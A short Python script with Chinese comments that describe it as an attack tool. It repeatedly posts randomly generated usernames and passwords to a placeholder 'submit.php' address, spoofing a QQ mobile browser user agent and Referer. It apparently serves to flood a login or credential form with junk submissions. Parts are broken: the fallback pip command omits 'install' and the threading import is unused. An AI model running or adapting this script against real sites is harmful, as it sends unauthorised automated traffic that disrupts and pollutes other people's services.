import os
import sys
import random
import time
import threading
try:
    import requests
except:
    os.system('pip -i https://pypi.tuna.tsinghua.edu.cn/simple')


URL = "http://[Type your url]/submit.php" # 目标地址
HEA = {
    "Accept-Encoding": "gzip, deflate",
    "Referer": "http://[Type your url]/",
    "User-Agent": "Mozilla/5.0 (Linux; Android 5.1; OPPO R9tm Build/LMY47I; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043128 Safari/537.36 V1_AND_SQ_7.0.0_676_YYB_D PA QQ/7.0.0.3135 NetType/4G WebP/0.3.0 Pixel/1080"
}
i = 0  # 记录攻击次数
a = 0  # 记录失败次数

def attack():
    i = 1
    while i <= 5:
        username = str(random.randint(0, 99999999999))
        passwd = str(random.randint(0, 99999999999))
        print("\nusername:"+username+"\npassword:"+passwd)
        data = {
            "r": "0",
            "u": username,
            "p": passwd
        }
        r = requests.post(URL, params=data, headers=HEA)  # 发送数据
        print("status:"+str(r.status_code))
        print("times:"+str(i))
        i = i + 1


if __name__ == '__main__':
    attack()
